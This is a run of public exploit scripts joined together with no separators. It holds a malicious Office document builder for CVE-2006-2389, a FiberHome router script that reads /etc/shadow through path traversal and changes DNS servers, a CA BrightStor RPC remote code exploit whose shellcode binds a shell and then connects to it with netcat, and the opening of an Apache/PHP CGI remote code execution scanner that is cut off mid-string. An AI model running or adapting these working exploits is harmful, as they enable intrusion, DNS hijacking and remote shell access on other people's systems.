b"\x6A\xA2\x36\x12\x50\x17\x1F\xE1\x30\xFE\x85\xAF\xF1\x66\x98\xC8\xDA\x32\x45\xBF\xE7\x74\x46\xF8\xFE\x8E\x52\xFD"
b"\x76\xD2\xF3\x5B\xC8\xB3\xFD\xF6\x51\xFD\xD6\xD1\xFF\xB7\x8D\xFE\xBF\x69\xF4\xFF\xED\xA2\xE7\x37\x8A\x17\xD3\x6F"
b"\x0B\xD5\xC5\x92\xDA\xDD\x14\xE3\xAB\x1F\x47\x91\x25\x9C\x3F\x94\x66\x7E\x81\xC3\xFC\x7D\x6E\x69\x4F\x27\xD0\x78"
b"\xFD\xDF\xF3\xDF\xEA\xA7\xE6\xC5\xDD\x56\xF2\x1C\x85\x5B\x6B\xDE\xFE\xF7\xAC\x2F\xAF\x7C\x93\x73\xBC\xE7\x15\xD7"
b"\xAD\xA2\x7E\xE8\xCC\x26\xC2\x29\xBC\x71\xBF\x5F\xD2\xA0\x7E\x87\xDC\xCD\xFC\x96\x6B\xBC\xF9\x8D\xA0\xEA\xC6\x59"
b"\xDD\x1A\x56\x37\xD9\xEA\x76\xB4\xBA\x3D\xAD\x6E\x9E\xD5\x9D\x69\x75\x97\x98\xBB\x9A\x9A\x91\x32\xD2\x57\xC6\xC9"
b"\x18\xE4\xC8\x14\xFE\xAA\xBE\x45\x3F\x75\xF6\xBC\xCB\xFC\xE2\xD1\xE9\xF9\xFA\xD1\xEB\xB5\xFA\xCE\xB0\x73\x95\x79"
b"\x6A\x91\x9D\x61\x21\xA1\xAE\x50\x67\x88\xEB\x4F\x2D\x7D\x17\xCF\x6D\x75\xFB\xC8\x68\x19\x2B\x23\x65\x22\x8B\xD6"
b"\x9D\xEE\x14\xBA\xBD\x98\xEE\x58\x19\x66\x7C\xD9\xDA\x94\xF1\x38\x25\x34\x94\x35\x59\x26\xCC\x19\xEA\xF9\xFF\xBD"
b"\xDE\x5F\x5B\x1A\x4B\xD2\x5B\xFE\xC0\x67\x86\xF3\x49\xF5\x55\x6D\x93\x7A\xC6\xD4\xA3\xC2\x5C\x4E\x95\x6C\xA7\xDE"
b"\x4E\x26\x30\xFD\x61\xC6\x67\x6E\xA8\x92\xAC\x3E\x13\x1A\xE6\x0A\x0D\x0D\x55\x9F\x71\xFA\x7E\x66\xA9\xD5\x6D\xCF"
b"\x34\x72\x58\x3B\xE6\x1C\x26\x48\x0F\x3E\x3D\x82\x6E\x6F\xC9\x65\x1E\xB2\x45\xD5\xD1\x6D\x9A\x1A\xD3\x2F\x13\x12"
b"\xE1\x74\x86\x3A\x5D\xB6\xD3\xEF\xC0\x98\x26\x19\xF3\x30\x92\xBF\x9E\x35\x40\xD5\x44\x71\x5E\x1D\x3E\x27\x4E\x0A"
b"\x76\x33\x17\x99\xC6\xEA\x1E\x94\x3B\x78\xB9\xA2\x5E\x9B\xB3\xF6\x42\x0C\x73\xD5\x5B\x3D\x68\x35\x49\xD4\x06\x10"
b"\x12\xBB\xC6\x6B\x1A\x11\x85\x3B\xAE\x4A\x75\x42\x24\xE0\x77\xBD\x3A\x05\x93\x9E\x0D\xDB\x54\x66\xAD\xAC\x65\x53"
b"\xAB\x90\xE2\x3B\xE4\xE5\xB3\xFC\x7F\xC8\x92\xA4\x2B\xCD\x22\x6D\x7C\x57\x79\x55\x4E\x5F\x04\xFA\x17\xE3\x5E\xC9"
b"\xED\xD9\x80\x24\x46\x6A\xB8\x12\x5D\x75\x88\x40\xD7\xFB\x66\x2A\x27\x2B\xFD\xEE\x6E\xD5\x34\x72\x4D\x5D\xCD\xF8"
b"\x9B\xE2\x2A\x7E\xF7\xAB\x70\x78\xE9\x2C\x5C\x51\x3A\xC3\x8C\xBB\x22\x9D\xC5\xFA\xAB\xCD\xF4\xC0\xDD\x4B\x8F\x9D"
b"\xEA\x91\x19\xFB\xC2\x83\xE1\xD2\xF0\x8A\x57\x3E\x51\x6B\x5A\x55\x94\xE5\xAD\xE1\xF3\xC4\xDC\xF0\x55\xAB\x11\xB5"
b"\x7E\x56\x8B\x59\xEB\x6D\x10\xB3\xCA\x51\xFF\xFF\x42\x35\x31\x38\x20\xC6\xB3\x2B\x8C\xFF\x03\xAE\xAA\x2D\xD5\x14"
b"\x42\x35\x12\xA8\xE4\x50\x0D\x0B\xC4\xB8\x65\xA8\xEA\xD4\x56\x0E\xB3\x5E\xED\x42\x97\xC3\xBA\xF4\x71\x18\x6D\x0D"
b"\x24\xC3\x61\xB4\xC1\x30\x76\x3B\xB5\xCB\x8C\x77\x98\xCD\x09\xA6\x3A\xCC\xE9\x1F\x62\xA2\xB5\xC4\x7C\x4F\x82\x4F"
b"\x32\xFB\x1B\xBB\x9C\x99\x35\x3E\x9F\xE0\xF7\x26\xEF\xF7\xF8\xBF\x56\xF3\xDD\x3D\x67\xC2\xD8\x61\xD9\x62\xE4\xED"
b"\x3E\xAF\xE6\xA3\xB1\x1C\xF8\x52\xBD\x56\xF3\xD6\x6D\xF4\x2D\x13\x72\x26\xE6\x8C\xCA\x4D\xE8\x9F\x33\x61\x44\x42"
b"\x8B\x46\x29\xC6\x73\x2D\x0A\x93\xF1\x7A\xE7\x9F\xDA\xBE\x30\xEB\x1D\x87\xF7\x6B\xEB\x9F\xBC\x18\xEB\x53\x55\x27"
b"\xAA\xAB\xAA\x94\x10\x6B\xDD\xEA\xA4\x93\x4E\x3A\xE9\xA4\x93\x4E\x3A\xE9\xA4\x93\x4E\x3A\xE9\xA4\xD3\xF9\xA4\xB3"
b"\x5D\xFF\x3B\x3F\x7C\xEF\xC3\xC5\x8D\xAA\xC7\x3E\xFC\x28\xD7\xFF\xC9\xA7\x56\xA9\xEB\xFF\x93\x38\x92\x6D\x0E\x57"
b"\x5F\x46\xA8\x6B\x6E\x75\x63\x54\x5D\xEF\xAB\xDF\x56\xA8\xEB\x7D\x75\x67\x53\xDD\x23\x98\x2B\xE6\xD7\x42\xF3\x11"
b"\x05\xF5\x8C\x0B\x75\xFD\xBC\x4C\xCC\x6B\xE4\xBF\xA0\x0A\xD6\x8A\x79\xBD\xAF\xEE\x1B\xA8\xEB\x7F\xF5\xDF\x61\xBD"
b"\xAF\xEB\xD5\xEB\x04\xE9\x6F\x5C\x03\xAB\x1B\x6A\xAA\x9B\x64\x75\xD5\xED\x1E\xD5\xFD\x36\x26\xC2\x98\x86\x58\xD3"
b"\x0A\xD4\xAD\x15\xEB\xF9\x51\x43\xB1\xFB\x04\xD1\xB1\xE6\x64\xD4\xE4\x22\xBC\x06\x17\xFE\xC6\x43\xA5\x27\xA0\xFE"
b"\x11\xDF\x37\x95\x4F\x9F\x9E\xA7\xD3\xFF\x54\x2A\xE1\x6E\xF3\xBF\x99\x2E\x74\x21\xE8\xA4\xD3\x25\x95\x2E\xF4\x0E"
b"\xAF\x93\x4E\x3A\xE9\xA4\x93\x4E\x3A\x5D\x8A\xC9\xB8\xCE\x97\xA2\xEF\x97\xD5\x75\xBC\xBA\x86\x57\xDF\x7B\xAB\xEF"
b"\xEA\xD5\xC5\xB0\xFA\x6E\x5E\x5D\x43\xAB\x6B\x73\x75\x9D\x6E\xFE\x40\xC7\xBC\x96\x57\xD7\xF9\xEA\x3B\x7C\x75\x3D"
b"\xAF\xDA\x43\x55\x16\xF3\x9A\x5E\x5D\xF7\xAB\x96\x4F\xD5\x10\x8F\xEA\x62\xB6\x80\x52\x0D\x1A\xD5\x45\x76\x6D\x31"
b"\xDB\x4E\xD5\x11\xD5\xB8\x46\xE4\x32\xA8\xC6\x99\xD6\xEF\xA7\xD5\x7F\x7C\x10\xF5\x48\x84\x06\x62\x5E\xEB\x37\x14"
b"\xB3\xE5\xD4\x95\x50\xFF\xE9\xE1\x2A\x31\x1F\x80\x78\xB5\x18\xFF\xAD\x44\x54\xC3\x4C\xF5\x3F\x21\x9A\x42\x35\x92"
b"\xB8\x46\xD4\xFF\x0E\x11\x69\x21\xEA\xFF\x90\x88\x5C\x0B\xD5\xD8\xB2\xB5\x14\xB5\xD5\x6A\x2B\xAA\xC1\x91\x6A\x40"
b"\xA4\x1A\xFE\x98\xF7\x2D\xAE\x43\x27\x74\x86\xFA\x6F\xF5\xD7\x23\x1D\x37\xA0\xAB\x18\xED\xBB\xA4\x3B\x54\x43\x4E"
b"\xD5\x72\xEB\x46\xA8\x46\xAB\xBD\x45\x35\x9D\x32\xFF\x7F\x75\x3F\xF4\xC7\x00\xA8\x7F\x91\x3C\x48\x8C\x47\x67\xC8"
b"\x60\x0C\x11\xF3\x5F\x61\xDF\x8C\x0C\xA8\x06\xAD\xAA\x91\xA9\xFA\x5F\xD9\x23\xA0\x1A\x2B\xA9\x16\x2C\xB7\x8A\x79"
b"\x7F\x45\x3D\xEF\x42\x3D\x83\xE2\x6C\xCF\xBC\x50\xCF\xE2\xB0\x7B\xEE\x85\x7A\x46\x47\xA0\x67\x5F\xA8\xE7\x76\xE4"
b"\x89\xFD\xF3\x2F\xFE\x24\xEA\xDE\x90\xDB\x7D\x0F\xDD\x7B\x71\x9F\x98\xF7\x73\xEE\xC7\x03\xF8\xB3\x98\xED\x3F\x1E"
b"\xC4\x43\x78\x58\xCC\xFB\x3C\x8F\x60\x01\x1E\x15\xB3\x5D\x88\x7A\x76\xA5\x7A\xC4\xC5\xE3\x62\xDE\xFF\x51\xF7\x50"
b"\x54\xCB\x36\xD5\x78\xEB\x49\x3C\x85\xA7\xA1\xFE\xA7\x88\xBA\x2F\xF4\x2C\x54\x8B\xAA\xE7\xB0\x02\xCF\x5B\xF3\xF1"
b"\x82\x98\xF7\x8B\x5E\xC4\x2A\xBC\x24\x66\x7B\x93\x97\xAD\xE1\xAF\x88\x79\x1F\xE9\x55\xAC\xC3\x6B\x78\x1D\x6F\x58"
b"\xC3\x7F\xB1\xBC\x65\xE5\x3D\x2E\xF5\xD4\xCB\x68\x3C\x97\xCB\xBE\x78\x1D\xDB\x55\x2E\xDB\x92\xDA\x62\x82\x4F\xEA"
b"\xDF\xFE\x78\xC6\xA5\xEA\x90\xB0\x08\xF3\x5E\xE2\x26\x73\x70\x27\xEF\xF7\x1E\xC8\xDA\xDC\x43\xB5\x71\x79\xDB\xDA"
b"\xF6\x54\xBA\x9A\xBD\x66\x18\x7B\x80\xD9\x4C\xAF\xE4\x29\xC6\x68\xE4\x58\x94\x82\xF9\xCC\x1C\xBC\xDB\xC1\x7C\xDD"
b"\x9F\xA5\x9F\xC0\x9E\xD7\x91\xEE\x2D\xEC\x3D\xAA\xE9\xE3\x38\xC9\x3D\xEB\xE7\xBD\x53\xBC\x38\x1D\xAA\xCE\x2C\xC9"
b"\xF4\x55\xAA\x15\x63\xDE\x55\x0C\xA5\xE6\x50\x53\x55\x8D\x17\xD5\xBA\xBF\x9E\xA9\x8F\x32\xE6\x49\xF5\xC9\x65\xFF"
b"\xCF\x31\xF6\x77\xBB\x54\x9F\xE9\xAB\x35\xEE\xB2\xE6\x21\x98\x69\x1B\xFF\xAA\xC9\x6A\x7B\x18\x5A\x6C\xC9\x4B\x36"
b"\x3F\xCD\x99\x7E\x49\xD7\xFF\x1A\xAF\xE9\x3B\x8C\x26\x97\x63\xA9\xCB\x7A\xB0\x15\x64\x05\xF3\x71\x9F\x54\x81\xE9"
b"\xAB\x35\xA9\x8E\x59\x25\x59\xFF\x9E\x29\x99\x53\x1D\xC9\x1A\xC8\xA5\x3E\xCF\xB1\x9A\xAB\x06\x9F\xAA\xB0\x04\xE7"
b"\x5A\x7E\xCF\x76\xEF\xE9\x96\x68\x02\x41\xA4\x92\xAE\x7F\xEF\xA4\x66\x46\xD7\x83\x97\x6E\x72\x50\xFA\x21\x91\xE6"
b"\x36\xE4\x5F\x77\xAB\xF3\xB7\x8E\x39\xB7\x4C\x1A\x3B\x72\x5C\x6E\x82\x6F\x83\x46\xE3\x9C\xB0\x5B\x6F\xF5\x92\x77"
b"\x18\x3B\xB3\x7A\xDD\xC8\xF3\xF6\x46\xCD\xE5\x78\x8B\x35\xB7\x95\xD6\x16\xAE\xD3\x6F\x95\xFE\x1F\x2A\x33\x0C\x59"
)

print ("[+] Microsoft Office Property Code Execution exploit (CVE-2006-2389)")
if len(sys.argv) != 2:
	print ("[+] Usage: "+ sys.argv[0] + " file.doc")
	exit(0)
	
	
evilbuff = bytearray(zlib.decompress(compressedfile))


payload  = b"\xE1\xE2\xE2\xE3"
payload += b"\xEB\x15\xFC\xFC"
payload += "\x90" * 20
payload	+= shellcode
payload += "\x90" * (704-len(shellcode))

offset = 0x16730


for i in range(0,len(payload)):
	evilbuff[offset + i] = payload[i]

	
file = sys.argv[1]
f = open(file,mode='wb')
f.write(evilbuff)
print ("[+] Done")# Exploit Title: Directory Path Traversal FiberHome Modem Router HG-110 / Remote Change DNS Servers
# Date: 22/09/2013
# Exploit Author: Javier Perez - javier@thecenutrios.com - @the_s41nt
# Vendor Homepage: http://hk.fiberhomegroup.com/
# Version: HG110_BH_V1.6


# PoC: Remote Change DNS Servers
# Example file "shadow": http://<public_ip>:8000/cgi-bin/webproc?getpage=../../../../../../../../../../../../etc/shadow&var:menu=advanced&var:page=dns

import urllib
import urllib2

ip = raw_input ("Enter Public IP: ")
dns1 = raw_input ("Enter DNS1: ")
dns2 = raw_input ("Enter DNS2: ")
url = 'http://'+ip+':8000/cgi-bin/webproc?getpage=html/index.html&var:menu=setup&var:page=lan'
user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
modificar = '%3AInternetGatewayDevice.LANDevice.1.X_TWSZ-COM_ProxyArp=0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DomainName=bamovistarwifi&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1.Enable=1&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.2.Enable=1&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1.IPInterfaceIPAddress=192.168.1.1&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1.IPInterfaceSubnetMask=255.255.255.0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.2.IPInterfaceIPAddress=10.167.64.81&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.2.IPInterfaceSubnetMask=255.255.255.248&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DHCPServerEnable=1&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.MinAddress=192.168.1.33&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.MaxAddress=192.168.1.50&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DHCPLeaseTime=28800&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DHCPRelay=0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.SubnetMask=255.255.255.0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPRouters=192.168.1.1&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.1.X_TWSZ-COM_DHCPEnabled=1&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.2.X_TWSZ-COM_DHCPEnabled=1&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.3.X_TWSZ-COM_DHCPEnabled=1&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.4.X_TWSZ-COM_DHCPEnabled=1&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.X_TWSZ-COM_UseIPRoutersAsDNSServer=0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DNSServers='+dns1+'%2C'+dns2+'&errorpage=html%2Findex.html&getpage=html%2Findex.html&var%3Amenu=setup&var%3Apage=lan&obj-action=set&var%3Aerrorpage=lan&%3AInternetGatewayDevice.LANDevice.1.LANEthernetInterfaceConfig.1.DhcpServerEnable=1&%3AInternetGatewayDevice.LANDevice.1.LANEthernetInterfaceConfig.2.DhcpServerEnable=1&%3AInternetGatewayDevice.LANDevice.1.LANEthernetInterfaceConfig.3.DhcpServerEnable=1&%3AInternetGatewayDevice.LANDevice.1.LANEthernetInterfaceConfig.4.DhcpServerEnable=1'
headers = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11' }

req = urllib2.Request(url, modificar, headers)
response = urllib2.urlopen(req)

url = 'http://'+ip+':8000/cgi-bin/webproc?getpage=html/index.html&var:menu=maintenance&var:page=system'
user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
modificar = 'reboot=Reboot&obj-action=reboot&var%3Anoredirect=1&var%3Amenu=maintenance&var%3Apage=system&var%3Aerrorpage=system&getpage=html%2Fpage%2Frestarting.html'
headers = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11' }

req = urllib2.Request(url, modificar, headers)
response = urllib2.urlopen(req)
the_page = response.read()source: http://www.securityfocus.com/bid/20365/info
 
Multiple Computer Associates products are prone to multiple buffer-overflow vulnerabilities because the applications using an affected library fail to properly bounds-check user-supplied input before copying it to an insufficiently sized memory buffer.
 
Exploiting these issues allows attackers to execute arbitrary machine code within the context of the affected application.

#!/usr/bin/python
#
# Computer Associates (CA) Brightstor Backup Mediasvr.exe Remote Code Exploit
# (Previously Unknown)
#
# There seems to be an design error in the handling of RPC data with xdr procedures
# across several .dll's imported by Mediasvr.exe. Four bytes from an RPC packet are
# processed as a particular address (xdr_handle_t data which is run through multiple bit
# shifts, and reversing of bytes), and eventually loaded into ECX.
#
# The 191 (0xbf) procedure, followed by nulls (at least 8 bytes of nulls, which may
# be Null Credentials and Auth?) leads to an exploitable condition.
#
# .text:0040AACD 008                 mov     ecx, [esp+8]
# .text:0040AAD1 008                 mov     dword_418820, esi
# .text:0040AAD7 008                 push    offset dword_418820
# .text:0040AADC 00C                 mov     eax, [ecx]
# .text:0040AADE 00C                 call    dword ptr [eax+2Ch]
#
# At this point, you have control of ECX (esp+8 is your address data). The data from the packet
# is stored in memory and is relatively static (see NOTE).
#
# The address is then loaded into EAX, and then called as EAX+2Ch, which is
# controllable data from the packet. In this code, I just jump ahead to
# the portbinding shellcode.
#
# NOTE: The only issue I have found is when the system is rebooted, the packet data
# appears at a higher memory location when Mediasvr.exe crashes
# and is restarted. I have accounted for this in the code, when the port that
# Mediasvr.exe is listening on is below TCP port 1100, which is usually only after
# a reboot
#
# This was tested on BrightStor ARCserve Backup 11.5.2.0 (SP2) with the latest
# CA patches on Windows XP SP2 (I believe there is some issue with SP1, which
# is more then likely the memory locations)
#
# The patches include the following updates to Mediasvr.exe
# http://supportconnectw.ca.com/public/storage/infodocs/babimpsec-notice.asp
#
# CA has been notified
#
# Author: M. Shirk
# Tester: Tebodell
#
# (c) Copyright 2007 (Shirkdog Security) shirkdog_list $ at % hotmail dot com
#
# Use at your own Risk: You have been warned
#------------------------------------------------------------------------

import os
import sys
import time
import socket
import struct

#------------------------------------------------------------------------

#Portbind shellcode; Binds shell on TCP port 4444
shellcode  = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
shellcode += "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
shellcode += "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
shellcode += "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
shellcode += "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
shellcode += "\x4d\x34\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x58"
shellcode += "\x4e\x56\x46\x42\x46\x42\x4b\x58\x45\x54\x4e\x53\x4b\x48\x4e\x57"
shellcode += "\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x48\x4f\x44\x4a\x51\x4b\x38"
shellcode += "\x4f\x55\x42\x32\x41\x50\x4b\x4e\x49\x44\x4b\x58\x46\x33\x4b\x58"
shellcode += "\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"
shellcode += "\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
shellcode += "\x46\x4f\x4b\x53\x46\x35\x46\x52\x4a\x42\x45\x57\x45\x4e\x4b\x48"
shellcode += "\x4f\x45\x46\x52\x41\x30\x4b\x4e\x48\x46\x4b\x38\x4e\x50\x4b\x54"
shellcode += "\x4b\x48\x4f\x45\x4e\x41\x41\x30\x4b\x4e\x43\x30\x4e\x32\x4b\x58"
shellcode += "\x49\x48\x4e\x36\x46\x42\x4e\x41\x41\x56\x43\x4c\x41\x53\x4b\x4d"
shellcode += "\x46\x56\x4b\x38\x43\x54\x42\x43\x4b\x58\x42\x44\x4e\x30\x4b\x38"
shellcode += "\x42\x47\x4e\x41\x4d\x4a\x4b\x58\x42\x44\x4a\x30\x50\x55\x4a\x56"
shellcode += "\x50\x48\x50\x34\x50\x30\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x36"
shellcode += "\x43\x45\x48\x56\x4a\x46\x43\x53\x44\x33\x4a\x46\x47\x37\x43\x57"
shellcode += "\x44\x33\x4f\x35\x46\x35\x4f\x4f\x42\x4d\x4a\x36\x4b\x4c\x4d\x4e"
shellcode += "\x4e\x4f\x4b\x53\x42\x45\x4f\x4f\x48\x4d\x4f\x35\x49\x38\x45\x4e"
shellcode += "\x48\x46\x41\x58\x4d\x4e\x4a\x30\x44\x30\x45\x35\x4c\x36\x44\x30"
shellcode += "\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x35"
shellcode += "\x4f\x4f\x48\x4d\x43\x35\x43\x45\x43\x55\x43\x45\x43\x35\x43\x34"
shellcode += "\x43\x55\x43\x34\x43\x45\x4f\x4f\x42\x4d\x48\x46\x4a\x36\x41\x41"
shellcode += "\x4e\x45\x48\x36\x43\x45\x49\x58\x41\x4e\x45\x39\x4a\x56\x46\x4a"
shellcode += "\x4c\x31\x42\x37\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x46\x42\x31"
shellcode += "\x41\x55\x45\x55\x4f\x4f\x42\x4d\x4a\x36\x46\x4a\x4d\x4a\x50\x42"
shellcode += "\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x55\x45\x35\x4f\x4f\x42\x4d"
shellcode += "\x4a\x36\x45\x4e\x49\x54\x48\x58\x49\x44\x47\x55\x4f\x4f\x48\x4d"
shellcode += "\x42\x55\x46\x35\x46\x35\x45\x35\x4f\x4f\x42\x4d\x43\x39\x4a\x56"
shellcode += "\x47\x4e\x49\x47\x48\x4c\x49\x37\x47\x45\x4f\x4f\x48\x4d\x45\x45"
shellcode += "\x4f\x4f\x42\x4d\x48\x46\x4c\x36\x46\x56\x48\x36\x4a\x46\x43\x46"
shellcode += "\x4d\x46\x49\x58\x45\x4e\x4c\x56\x42\x35\x49\x55\x49\x52\x4e\x4c"
shellcode += "\x49\x38\x47\x4e\x4c\x56\x46\x54\x49\x58\x44\x4e\x41\x53\x42\x4c"
shellcode += "\x43\x4f\x4c\x4a\x50\x4f\x44\x54\x4d\x52\x50\x4f\x44\x34\x4e\x32"
shellcode += "\x43\x49\x4d\x48\x4c\x47\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36"
shellcode += "\x44\x47\x50\x4f\x43\x4b\x48\x41\x4f\x4f\x45\x57\x46\x34\x4f\x4f"
shellcode += "\x48\x4d\x4b\x45\x47\x55\x44\x55\x41\x45\x41\x35\x41\x55\x4c\x36"
shellcode += "\x41\x30\x41\x35\x41\x55\x45\x45\x41\x45\x4f\x4f\x42\x4d\x4a\x56"
shellcode += "\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x35\x4f\x4f\x48\x4d\x4c\x56"
shellcode += "\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f\x42\x4d\x4b\x38\x47\x55\x4e\x4f"
shellcode += "\x43\x48\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x55\x4f\x4f\x42\x4d"
shellcode += "\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x43\x55\x4f\x4f\x48\x4d"
shellcode += "\x4f\x4f\x42\x4d\x5a\x90"

#------------------------------------------------------------------------

#First Packet
rpc_packet1="\x80\x00\x80\x34\x65\xcf\x4c\x7b\x00\x00\x00\x00\x00\x00\x00"
rpc_packet1+="\x02\x00\x06\x09\x7e\x00\x00\x00\x01"

#Prodcedure 190 and nulls
rpc_packet1+="\x00\x00\x00\xbf\x00\x00\x00\x00\x00\x00\x00\x00"

#Apparently these 4 bytes can be anything
rpc_packet1+="\x00\x00\x00\x00"

#This value is important for the location of the next address
rpc_packet1+="\x00\x00\x00\x00"

#Hardcoded Address loaded into ECX
rpc_packet1+="\x00\xae\x27\x64"

#Just spacing
rpc_packet1+="\x41\x42\x43\x44"

#Addess in memory, loaded into EAX and called with EAX+2Ch to get to shellcode
rpc_packet1+="\x3c\x27\xae\x00"

#jump to shellcode for packet 1
rpc_packet1+="\x6c\x27\xae\x00"
rpc_packet1+="\xeb\x01"
rpc_packet1+=shellcode

#------------------------------------------------------------------------

#Second Packet
rpc_packet2="\x80\x00\x80\x34\x65\xcf\x4c\x7b\x00\x00\x00\x00\x00\x00\x00"
rpc_packet2+="\x02\x00\x06\x09\x7e\x00\x00\x00\x01"

#Procedure 190 and nulls
rpc_packet2+="\x00\x00\x00\xbf\x00\x00\x00\x00\x00\x00\x00\x00"

#Apparently these 4 bytes can be anything
rpc_packet2+="\x00\x00\x00\x00"

#This value is important for the location of the next address
rpc_packet2+="\x00\x00\x00\x00"

#Hardcoded Address loaded into ECX that seems to be hit after Mediasvr.exe has been
#restarted
rpc_packet2+="\x00\x9e\x27\x64"

#Just spacing
rpc_packet2+="\x41\x42\x43\x44"

#Addess stored in memory, loaded into EAX and called with EAX+2Ch to get to shellcode
rpc_packet2+="\x3c\x27\x9e\x00"

#jump to shellcode for packet 2
rpc_packet2+="\x6c\x27\x9e\x00"
rpc_packet2+="\xeb\x01"
rpc_packet2+=shellcode

# Portmap request for Mediasvr.exe
rpc_portmap_req="\x80\x00\x00\x38\x21\x84\xf7\xc9\x00\x00\x00\x00\x00\x00\x00"
rpc_portmap_req+="\x02\x00\x01\x86\xa0\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00"
rpc_portmap_req+="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
rpc_portmap_req+="\x06\x09\x7e\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x00"

#------------------------------------------------------------------------

def GetMediaSvrPort(target):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((target,111))
    sock.send(rpc_portmap_req)
    rec = sock.recv(256)
    sock.close()

    port1 = rec[-4]
    port2 = rec[-3]
    port3 = rec[-2]
    port4 = rec[-1]   
   
    port1 = hex(ord(port1))
    port2 = hex(ord(port2))
    port3 = hex(ord(port3))
    port4 = hex(ord(port4))
    port = '%02x%02x%02x%02x' % (int(port1,16),int(port2,16),int(port3,16),int(port4,16))
   
    port = int(port,16)
    if port < 1100:
        print '[+] Fresh Meat: Mediasvr.exe has not been restarted, Sending Packet 1 to: Target: %s Port: %s' %(target,port)
        ExploitMediaSvr(target,port,1)
    else:
        print '[+] Mediasvr.exe has been restarted, Sending Packet 2 to: Target: %s Port: %s' % (target,port)
        ExploitMediaSvr(target,port,2)

def ExploitMediaSvr(target,port,p):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, port))
    if p == 1:
        sock.send(rpc_packet1)    
    elif p == 2:
        sock.send(rpc_packet2)
       sock.close ()


if __name__=="__main__":
       try:
               target = sys.argv[1]
       except IndexError:
        print '[+] Computer Associates (CA) Brightstor Backup Mediasvr.exe Remote Exploit'
               print '[+] Author: Shirkdog'
                   print '[+] Usage: %s <target ip>\n' % sys.argv[0]
                   sys.exit(-1)

       print '[+] Computer Associates (CA) Brightstor Backup Mediasvr.exe Remote Exploit'
       print '[+] Author: Shirkdog'

       GetMediaSvrPort(target)
           
       print '[+] Exploit sent. Using nc to connect to: %s on port 4444' % target
       time.sleep(3)
       connect = "/usr/bin/nc -vn " + target + " 4444"
       os.system(connect)

#!/usr/bin/env python
#
# ap-unlock-v2.py - apache + php 5.* rem0te c0de execution 0day (better version)
#
# NOTE:
#   - quick'n'dirty VERY UGLYY C=000DEEE IZ N0T MY STYLE :(((
#   - for connect back shell start netcat/nc and bind port on given host:port
#   - is ip-range scanner not is multithreaded, but iz multithreaded iz in
#   random scanner and is scanner from file (greets to MustLive)
#   - no ssl support
#   - more php paths can be added
#   - adjust this shit for windows b0xes
#
# 2013
# by noptrix - http://nullsecurity.net/

import sys
import socket
import argparse
import threading
import time
import random
import select


NONE = 0
VULN = 1
SCMD = 2
XPLT = 3

t3st = 'POST /cgi-bin/php/%63%67%69%6E/%70%68%70?%2D%64+%61%6C%75%6F%6E+%2D' \
        '%64+%6D%6F%64+%2D%64+%73%75%68%6F%6E%3D%6F%6E+%2D%64+%75%6E%63%74%73' \
        '%3D%22%22+%2D%64+%64%6E%65+%2D%64+%61%75%74%6F%5F%70%72%%74+%2D%64+' \
